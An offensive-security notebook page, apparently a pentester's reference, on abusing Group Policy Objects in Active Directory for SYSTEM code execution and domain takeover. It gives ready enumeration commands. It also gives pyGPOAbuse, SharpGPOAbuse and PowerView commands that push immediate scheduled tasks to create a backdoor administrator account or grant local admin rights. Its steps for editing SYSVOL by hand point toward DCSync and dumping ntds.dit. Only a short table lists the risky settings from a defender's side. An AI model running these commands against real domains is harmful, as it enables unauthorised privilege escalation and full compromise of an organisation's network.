# GPO Abuse

#GPOAbuse #GroupPolicy #ActiveDirectory #LateralMovement #Privesc

## What is GPO Abuse?

Group Policy Objects push configuration, scheduled tasks, scripts, and security settings to every computer/user in the OUs they're linked to. A principal with **edit rights** (`GenericWrite`/`GenericAll`/`WriteDacl` on the GPO object) — or **link rights** on an OU — can push an immediate scheduled task or startup script to get code execution as **SYSTEM** on every machine the GPO applies to. Fast, wide blast radius, and easy to miss because GPO ACLs are often not audited alongside AD object ACLs.

- Two rights matter: edit the **GPO's contents** (write to its `SYSVOL` folder, gated by the GPO object's DACL) and **link** a GPO to an OU (`gPLink` write on the OU).
- Blast radius = the machines/users under every OU the GPO is linked to. A GPO linked to the **Domain Controllers** OU = domain compromise.
- Refresh is ~90 min by default, or immediate via an "Immediate Task" (Group Policy Preferences).

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/AD/BloodHound\|BloodHound]] | Find `GenericWrite`/`Owns`/`WriteDacl` on GPOs and `GPLink` edges |
| [[Tools/AD/PowerView\|PowerView]] | Enumerate GPOs/links/affected hosts; `New-GPOImmediateTask` |
| [[Tools/AD/SharpGPOAbuse\|SharpGPOAbuse]] | Windows: add computer/user task, local admin, or logon script to a writable GPO |
| [[Tools/AD/pyGPOAbuse\|pyGPOAbuse]] | Linux: partial SharpGPOAbuse port — immediate scheduled task via a writable GPO |
| [[Tools/Lateral Movement/NetExec\|NetExec]] | Enumerate/validate access; execute the resulting SYSTEM foothold |

---

## Enumeration

```powershell
# PowerView (Windows)
Get-DomainGPO | select displayname, name                      # all GPOs (name = {GUID})
Get-DomainGPO -Identity '<GUID>' | Get-DomainObjectAcl -ResolveGUIDs | `
  ? { $_.ActiveDirectoryRights -match 'WriteProperty|GenericWrite|GenericAll|WriteDacl' }
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ObjectAceType -match 'GP-Link'}  # link rights
# Which computers does a GPO actually affect?
Get-DomainGPOComputerLocalGroupMapping                          # (or map GPO → OU → computers)
```

```bash
# Linux — find GPOs you can write; BloodHound "Affected Objects" on the GPO node
nxc ldap <DC> -u <user> -p <pass> --bloodhound --collection All --dns-server <DC>
bloodyAD --host <DC> -d <domain> -u <user> -p <pass> get writable --otype GPO
```

BloodHound edges to look for: **`GenericWrite`/`GenericAll`/`Owns`/`WriteDacl`/`WriteOwner` → GPO**, and **`GPLink` (OU → GPO)** — then check the GPO's *Affected Objects* to see the blast radius (aim for a DC/server OU).

---

## Attack Vectors

### Immediate Scheduled Task → SYSTEM (computer GPO)

```bash
# Linux (pyGPOAbuse) — default action adds a local admin; -command runs anything as SYSTEM
python3 pygpoabuse.py <domain>/<user>:<pass> -gpo-id <GPO-GUID> -taskname "Update" \
  -dc-ip <DC> -command 'net user pwn P@ssw0rd! /add && net localgroup administrators pwn /add' \
  -filter-enabled -target-dns-name <targethost>
```

```powershell
# Windows (SharpGPOAbuse) — add a computer task to a GPO you can edit
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\user `
  --Command "cmd.exe" --Arguments "/c net localgroup administrators DOMAIN\user /add" `
  --GPOName "Vulnerable GPO"

# PowerView equivalent
New-GPOImmediateTask -TaskName Update -GPODisplayName "Vulnerable GPO" `
  -CommandArguments '-c "net localgroup administrators DOMAIN\user /add"' -Force
```

### Add Local Admin / User Task

```powershell
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount DOMAIN\user --GPOName "Vulnerable GPO"
SharpGPOAbuse.exe --AddUserTask --TaskName "x" --Author DOMAIN\user --Command "cmd.exe" `
  --Arguments "/c calc" --GPOName "Vulnerable GPO"
```

### GPO Linked to the Domain Controllers OU → Domain Compromise

If a writable GPO is linked to the DCs OU (or you hold `gPLink` write on that OU to link your own), the SYSTEM task runs **on a domain controller** → immediately DCSync / dump `ntds.dit`. Highest-value target — always check the DC OU's linked GPOs and their ACLs first.

### Manual Edit (no tooling)

The GPO's files live in `\\<domain>\SYSVOL\<domain>\Policies\{GUID}\`. Add a `Machine\Preferences\ScheduledTasks\ScheduledTasks.xml` (Immediate Task), then bump `versionNumber` in `GPT.INI` and the object's `versionNumber` attribute so clients re-apply. (Tooling handles the version bump automatically — do this only when tools are unavailable.)

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| Non-admins with `GenericWrite`/`GenericAll` on a GPO | Push SYSTEM task to every affected host |
| Writable GPO linked to the **DC OU** | Domain controller RCE → full domain compromise |
| `gPLink` write on an OU | Link an attacker GPO to that OU's computers |
| Wide/legacy GPOs linked to many OUs | One edit = mass code execution |
| GPP `cpassword` in SYSVOL (legacy) | AES-decryptable local creds (CVE-2014-1812) |
| GPO ACLs not audited with object ACLs | Blind spot — attackers find these first |

---

## Quick Reference

| Goal | Command |
|---|---|
| Writable GPOs | `Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? {GenericWrite/All}` |
| Blast radius | BloodHound GPO node → *Affected Objects* |
| Immediate task (Linux) | `python3 pygpoabuse.py <d>/<u>:<p> -gpo-id <GUID> -command '<cmd>' -dc-ip <DC>` |
| Computer task (Windows) | `SharpGPOAbuse.exe --AddComputerTask --GPOName "<GPO>" --Command cmd.exe --Arguments "/c ..."` |
| Add local admin | `SharpGPOAbuse.exe --AddLocalAdmin --UserAccount DOMAIN\u --GPOName "<GPO>"` |
| PowerView task | `New-GPOImmediateTask -TaskName x -GPODisplayName "<GPO>" -CommandArguments '...' -Force` |

---

> [!note] **See also** — GPO edit rights are just an ACL edge on a GPO object — enumerate them alongside [[Services/Active Directory/ACL Abuse|ACL Abuse]] (BloodHound `GenericWrite`→GPO); a DC-linked GPO yields the same endgame as [[Services/Active Directory/Kerberos|Kerberos]] golden-ticket/DCSync. Rides [[Services/Network management/LDAP|LDAP]] for enumeration and SYSVOL (SMB) for the write. Tools: [[Tools/AD/SharpGPOAbuse|SharpGPOAbuse]], [[Tools/AD/pyGPOAbuse|pyGPOAbuse]], [[Tools/AD/PowerView|PowerView]].

---

*Created: 2026-07-27*
*Updated: 2026-09-25*
*Model: claude-opus-4-8*
